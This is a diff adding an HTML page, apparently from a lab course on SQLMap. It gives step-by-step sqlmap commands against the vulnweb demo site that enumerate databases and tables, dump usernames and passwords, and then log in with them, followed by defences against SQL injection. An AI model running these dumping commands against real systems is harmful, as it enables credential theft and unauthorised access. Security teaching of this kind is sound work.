@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procedure</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="experiment-container">
+        <aside class="sidebar">
+            <ul>
+                <h3><u><b>Experiment 9:-</b></u></h3>
+                <li><a href="index.html">&#8226; Home</a></li>
+                <li><a href="page9.html">&#8226; Introduction</a></li>
+                <li><a href="aim-sqlmap.html">&#8226; Aim</a></li>
+                <li><a href="theory-sqlmap.html">&#8226; Theory</a></li>
+                <li><a href="procedure-sqlmap.html">&#8226; Procedure</a></li>
+                <li><a href="perform-lab-sqlmap.html">&#8226; Perform Lab</a></li>
+                <li><a href="knowledge-check-sqlmap.html">&#8226; Knowledge Check</a></li>
+                <li><a href="conclusion-sqlmap.html">&#8226; Conclusion</a></li>
+                
+            </ul>
+        </aside>
+        <div class="content-box">
+            <h2><u>Procedure</u></h2>
+        
+            <h3><u>Step 1: Install SQLMap</u></h3>
+            <p>SQLMap comes pre-installed in Kali Linux. However, if it is not installed, you can install it using the following command:</p>
+            <pre>
+            sudo apt-get update
+            sudo apt-get install sqlmap
+            </pre>
+            <p>Type the above command in the terminal to install SQLMap.</p>
+        
+            <h3><u>Step 2: Verify SQLMap Installation</u></h3>
+            <p>To ensure SQLMap is installed correctly, check its version:</p>
+            <pre>
+            sqlmap --version
+            </pre>
+            <p>This should display the installed SQLMap version.</p>
+        
+            <h3><u>Step 3: Identify SQL Injection Vulnerabilities</u></h3>
+            <p>Use SQLMap to check if a target URL is vulnerable to SQL Injection:</p>
+            <pre>
+            sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"
+            </pre>
+            <p>If the website is vulnerable, SQLMap will indicate the presence of an SQL Injection vulnerability.</p>
+        
+            <h3><u>Step 4: List Available Databases</u></h3>
+            <p>Once a vulnerability is found, retrieve the list of databases on the target system:</p>
+            <pre>
+            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+            </pre>
+            <p>This command lists all available databases on the target server.</p>
+        
+            <h3><u>Step 5: List Tables in a Database</u></h3>
+            <p>To retrieve the tables inside a specific database (e.g., `acuart`), use:</p>
+            <pre>
+            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
+            </pre>
+            <p>This command lists all tables inside the `acuart` database.</p>
+        
+            <h3><u>Step 6: Retrieve Columns in a Table</u></h3>
+            <p>To view the column names inside a table (e.g., `users`), run:</p>
+            <pre>
+            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
+            </pre>
+            <p>This command lists all the columns inside the `users` table.</p>
+        
+            <h3><u>Step 7: Extract Usernames</u></h3>
+            <p>To extract usernames from the `users` table, use:</p>
+            <pre>
+            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C name --dump
+            </pre>
+            <p>This command retrieves all stored usernames in the database.</p>
+        
+            <h3><u>Step 8: Extract Passwords</u></h3>
+            <p>To extract passwords from the `users` table, use:</p>
+            <pre>
+            sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C pass --dump
+            </pre>
+            <p>This command retrieves all stored passwords in the database.</p>
+        
+            <h3><u>Step 9: Attempt Login with Extracted Credentials</u></h3>
+            <p>After extracting login credentials, use them to log into the target system.</p>
+            <p>For example, if the retrieved credentials are:</p>
+            <pre>
+            Username: admin
+            Password: admin123
+            </pre>
+            <p>Use these credentials on the login page of the target application.</p>
+        
+            <h3><u>Example Output</u></h3>
+            <p>After executing the above commands, you may see output like this:</p>
+            <pre>
+            Database: acuart
+            Table: users
+            +----+--------+----------+
+            | ID | name   | pass     |
+            +----+--------+----------+
+            | 1  | admin  | admin123 |
+            | 2  | user1  | userpass |
+            +----+--------+----------+
+            </pre>
+        
+            <p><b>Explanation:</b></p>
+            <ul>
+                <li><b>Database: acuart</b> - The database that was targeted.</li>
+                <li><b>Table: users</b> - The table that contains user credentials.</li>
+                <li><b>Username and Passwords:</b> Retrieved credentials for authentication.</li>
+            </ul>
+        
+            <h3><u>Step 10: Secure Against SQL Injection</u></h3>
+            <p>To protect against SQL Injection, developers should:</p>
+            <ul>
+                <li><b>Use Prepared Statements</b> to avoid SQL concatenation.</li>
+                <li><b>Sanitize and Validate Input</b> before passing it to the database.</li>
+                <li><b>Limit User Privileges</b> to prevent unauthorized access.</li>
+                <li><b>Use Web Application Firewalls (WAFs)</b> to detect and block SQL injection attempts.</li>
+            </ul>
+        
+            <p>By implementing these security measures, developers can protect their web applications from SQL Injection attacks.</p>
+        </div>
+        
+        
+        
+    </div>
+</body>
+</html>
